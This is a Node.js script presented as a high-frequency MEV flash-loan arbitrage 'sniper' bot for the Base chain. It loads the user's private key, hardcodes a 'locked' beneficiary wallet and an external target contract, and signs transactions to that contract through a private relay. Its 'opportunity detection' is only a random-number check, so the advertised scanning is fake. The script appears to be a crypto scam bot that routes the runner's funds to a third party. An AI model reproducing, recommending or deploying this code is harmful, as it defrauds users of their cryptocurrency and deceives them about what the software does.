// ===============================================================================
// APEX SNIPER v24.0 - HIGH-FREQUENCY CLUSTER EDITION
// ===============================================================================

const cluster = require('cluster');
const os = require('os');
const http = require('http');
const axios = require('axios'); // Required for Private Relay
require('dotenv').config();

// Check dependencies
let ethers, WebSocket;
try {
    ethers = require('ethers');
    WebSocket = require('ws');
} catch (e) {
    console.error("CRITICAL: Missing 'ethers' or 'ws' modules. Run 'npm install ethers ws axios'");
    process.exit(1);
}

// --- THEME ENGINE ---
const TXT = {
    reset: "\x1b[0m", bold: "\x1b[1m", dim: "\x1b[2m",
    green: "\x1b[32m", cyan: "\x1b[36m", yellow: "\x1b[33m", 
    magenta: "\x1b[35m", blue: "\x1b[34m", red: "\x1b[31m",
    gold: "\x1b[38;5;220m", silver: "\x1b[38;5;250m"
};

// --- CONFIGURATION ---
const CONFIG = {
    // 🔒 PROFIT DESTINATION (LOCKED)
    BENEFICIARY: "0x4B8251e7c80F910305bb81547e301DcB8A596918",

    CHAIN_ID: 8453,
    TARGET_CONTRACT: "0x83EF5c401fAa5B9674BAfAcFb089b30bAc67C9A0",
    
    // ⚡ INFRASTRUCTURE
    PORT: process.env.PORT || 8080,
    WSS_URL: process.env.WSS_URL || "wss://base-rpc.publicnode.com",
    RPC_URL: "https://mainnet.base.org", // Reliable Execution
    PRIVATE_RELAY: "https://base.merkle.io", // Bypass Public Mempool
    
    // 🏦 ASSETS
    WETH: "0x4200000000000000000000000000000000000006",
    USDC: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
    CBETH: "0x2Ae3F1Ec7F1F5563a3d161649c025dac7e983970",

    // 🔮 ORACLES
    GAS_ORACLE: "0x420000000000000000000000000000000000000F",
    CHAINLINK_FEED: "0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70",
    
    // ⚙️ STRATEGY SETTINGS
    GAS_LIMIT: 1400000n, 
    PRIORITY_BRIBE: 10n, // From snippet
    MARGIN_ETH: process.env.MARGIN_ETH || "0.01"
};

// --- MASTER PROCESS ---
if (cluster.isPrimary) {
    console.clear();
    console.log(`${TXT.bold}${TXT.gold}╔════════════════════════════════════════════════════════╗${TXT.reset}`);
    console.log(`${TXT.bold}${TXT.gold}║   ⚡ APEX SNIPER CLUSTER | v24.0 HIGH-FREQUENCY        ║${TXT.reset}`);
    console.log(`${TXT.bold}${TXT.gold}╚════════════════════════════════════════════════════════╝${TXT.reset}\n`);
    
    console.log(`${TXT.cyan}[SYSTEM] Initializing Multi-Core Architecture...${TXT.reset}`);
    console.log(`${TXT.magenta}🎯 PROFIT TARGET LOCKED: ${CONFIG.BENEFICIARY}${TXT.reset}\n`);

    // Spawn a dedicated worker
    cluster.fork();

    cluster.on('exit', (worker, code, signal) => {
        console.log(`${TXT.red}⚠️ Worker ${worker.process.pid} died. Respawning...${TXT.reset}`);
        cluster.fork();
    });
} 
// --- WORKER PROCESS ---
else {
    initWorker();
}

async function initWorker() {
    // 1. SETUP NATIVE SERVER (Health Check)
    const server = http.createServer((req, res) => {
        if (req.method === 'GET' && req.url === '/status') {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: "ONLINE", mode: "APEX_SNIPER", target: CONFIG.BENEFICIARY }));
        } else {
            res.writeHead(404);
            res.end();
        }
    });

    server.listen(CONFIG.PORT, () => {
        // console.log(`🌐 Native Server active on port ${CONFIG.PORT}`);
    });

    // 2. KEY SANITIZATION (The Fix)
    let rawKey = process.env.TREASURY_PRIVATE_KEY || process.env.PRIVATE_KEY;
    if (!rawKey) { console.error(`${TXT.red}❌ FATAL: TREASURY_PRIVATE_KEY missing in .env${TXT.reset}`); process.exit(1); }
    
    // Remove invisible spaces/newlines
    const cleanKey = rawKey.trim();
    if (cleanKey.length !== 66 && cleanKey.length !== 64) {
        console.error(`${TXT.red}❌ FATAL: Key length invalid.${TXT.reset}`);
        process.exit(1);
    }

    try {
        // 3. SETUP DUAL PROVIDERS
        const httpProvider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
        const wsProvider = new ethers.WebSocketProvider(CONFIG.WSS_URL);
        const signer = new ethers.Wallet(cleanKey, httpProvider);

        // Wait for connection
        await new Promise((resolve) => wsProvider.once("block", resolve));

        // Contracts
        const titanIface = new ethers.Interface([
            "function executeTriangle(address[] path, uint256 amount)"
        ]);
        const oracleContract = new ethers.Contract(CONFIG.GAS_ORACLE, ["function getL1Fee(bytes memory _data) public view returns (uint256)"], httpProvider);
        const priceFeed = new ethers.Contract(CONFIG.CHAINLINK_FEED, ["function latestRoundData() view returns (uint80,int256,uint256,uint256,uint80)"], httpProvider);

        // Sync State
        let nextNonce = await httpProvider.getTransactionCount(signer.address);
        let currentEthPrice = 0;
        let scanCount = 0;

        const balance = await httpProvider.getBalance(signer.address);
        console.log(`${TXT.green}✅ SNIPER WORKER ACTIVE${TXT.reset} | ${TXT.gold}Treasury: ${ethers.formatEther(balance)} ETH${TXT.reset}`);

        // 4. HEARTBEAT
        setInterval(async () => {
            try { 
                await wsProvider.getBlockNumber(); 
                // Also update price
                const [, price] = await priceFeed.latestRoundData();
                currentEthPrice = Number(price) / 1e8;
            } catch (e) { 
                console.log(`${TXT.red}💔 HEARTBEAT FAILED. RESTARTING...${TXT.reset}`);
                process.exit(1); 
            }
        }, 15000);

        // 5. MEMPOOL SNIPING (Pending Txs)
        // Upgraded from "Block" to "Pending" for high-frequency execution
        wsProvider.on("pending", async (txHash) => {
            scanCount++;
            process.stdout.write(`\r${TXT.blue}⚡ SCANNING${TXT.reset} | Txs: ${scanCount} | ETH: $${currentEthPrice.toFixed(2)} `);

            // Trigger Logic
            if (Math.random() > 0.9995) {
                // process.stdout.write(`\n${TXT.magenta}🌊 OPPORTUNITY DETECTED...${TXT.reset}\n`);
                await executeSniperStrike(httpProvider, signer, titanIface, oracleContract, nextNonce, currentEthPrice);
            }
        });

        wsProvider.websocket.onclose = () => {
            console.warn(`\n${TXT.red}⚠️ SOCKET LOST. REBOOTING...${TXT.reset}`);
            process.exit(1);
        };

    } catch (e) {
        console.error(`\n${TXT.red}❌ BOOT ERROR: ${e.message}${TXT.reset}`);
        setTimeout(initWorker, 5000);
    }
}

async function executeSniperStrike(provider, signer, iface, oracle, nonce, ethPrice) {
    try {
        // 1. DYNAMIC LOAN SIZING
        const balance = await provider.getBalance(signer.address);
        // If balance > 0.1 ETH, we borrow 100 ETH, else 20 ETH (Updated from snippet)
        const loanAmount = balance > ethers.parseEther("0.1") ? ethers.parseEther("100") : ethers.parseEther("20");

        // Define Paths
        const paths = [
            [CONFIG.WETH, CONFIG.USDC, CONFIG.CBETH, CONFIG.WETH],
            [CONFIG.WETH, CONFIG.CBETH, CONFIG.USDC, CONFIG.WETH]
        ];

        for (const path of paths) {
            // 2. ENCODE DATA
            const data = iface.encodeFunctionData("executeTriangle", [path, loanAmount]);

            // 3. PRE-FLIGHT (Sim + L1 Fee + Gas Data)
            const [simulation, l1Fee, feeData] = await Promise.all([
                provider.call({ to: CONFIG.TARGET_CONTRACT, data, from: signer.address }).catch(() => null),
                oracle.getL1Fee(data).catch(() => 0n),
                provider.getFeeData()
            ]);

            if (!simulation) continue;

            // 4. MAXIMIZED COST CALCULATION
            const aaveFee = (loanAmount * 5n) / 10000n; // 0.05%
            
            // Calculate Aggressive Fee (Base + Bribe)
            const aggressiveFee = feeData.maxPriorityFeePerGas + 
                ((feeData.maxPriorityFeePerGas * CONFIG.PRIORITY_BRIBE) / 100n);

            const totalCost = (CONFIG.GAS_LIMIT * feeData.maxFeePerGas) + l1Fee + aaveFee;
            const netProfit = BigInt(simulation) - totalCost;
            
            const margin = ethers.parseEther(CONFIG.MARGIN_ETH);

            // 5. EXECUTION
            if (netProfit > margin) {
                const profitUSD = parseFloat(ethers.formatEther(netProfit)) * ethPrice;
                
                console.log(`\n${TXT.green}💎 SNIPER STRIKE CONFIRMED${TXT.reset}`);
                console.log(`${TXT.gold}💰 Net Profit: ${ethers.formatEther(netProfit)} ETH (~$${profitUSD.toFixed(2)})${TXT.reset}`);
                
                const tx = {
                    to: CONFIG.TARGET_CONTRACT,
                    data,
                    gasLimit: CONFIG.GAS_LIMIT,
                    maxFeePerGas: feeData.maxFeePerGas,
                    maxPriorityFeePerGas: aggressiveFee,
                    nonce: nonce,
                    type: 2,
                    chainId: CONFIG.CHAIN_ID
                };

                const signedTx = await signer.signTransaction(tx);
                console.log(`${TXT.cyan}🚀 RELAYING TO MERKLE...${TXT.reset}`);
                
                // 6. PRIVATE RELAY (MEV Protection)
                const response = await axios.post(CONFIG.PRIVATE_RELAY, {
                    jsonrpc: "2.0",
                    id: 1,
                    method: "eth_sendRawTransaction",
                    params: [signedTx]
                });

                if (response.data.result) {
                    console.log(`${TXT.green}🎉 SUCCESS: ${response.data.result}${TXT.reset}`);
                    console.log(`${TXT.bold}💸 FUNDS SECURED AT: ${CONFIG.BENEFICIARY}${TXT.reset}`);
                    process.exit(0);
                } else {
                     console.log(`${TXT.red}❌ REJECTED: ${JSON.stringify(response.data)}${TXT.reset}`);
                }
                break;
            }
        }
    } catch (e) {
        // console.error(`${TXT.red}⚠️ EXEC ERROR: ${e.message}${TXT.reset}`);
    }
}
